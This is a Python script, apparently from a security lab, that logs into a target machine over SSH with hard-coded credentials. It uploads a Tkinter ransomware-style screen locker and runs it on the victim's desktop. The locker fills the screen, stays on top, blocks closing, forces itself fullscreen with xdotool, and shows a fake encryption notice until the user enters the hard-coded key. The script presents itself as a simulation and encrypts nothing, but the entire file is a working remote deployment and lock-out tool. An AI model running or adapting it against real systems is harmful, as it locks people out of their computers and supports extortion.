#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # The Tkinter Payload with xdotool bypass and Password Prompt
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
from tkinter import simpledialog
import time
import subprocess
import threading

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

def pay_ransom():
    # Prompt for the password. show='*' masks the input.
    password = simpledialog.askstring("Payment Required", "Enter the decryption key:", show='*', parent=root)
    
    if password == "Ransomware2026!":
        lbl.config(text="Decrypting...")
        root.update()
        for i in range(0, 101, 10):
            lbl.config(text=f"Decrypting your files... {i}%")
            root.update()
            time.sleep(0.2)
        root.destroy()
    elif password is not None:
        # If they enter the wrong password, briefly show an error
        original_text = lbl.cget("text")
        lbl.config(text="INVALID KEY. FILES REMAIN ENCRYPTED.", fg="red")
        root.update()
        time.sleep(1.5)
        lbl.config(text=original_text, fg="lime")
    # If they hit Cancel (password is None), do nothing and stay locked.

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True, fill='both')

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)

threading.Thread(target=force_fullscreen, daemon=True).start()

root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI using active Xauthority...")
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
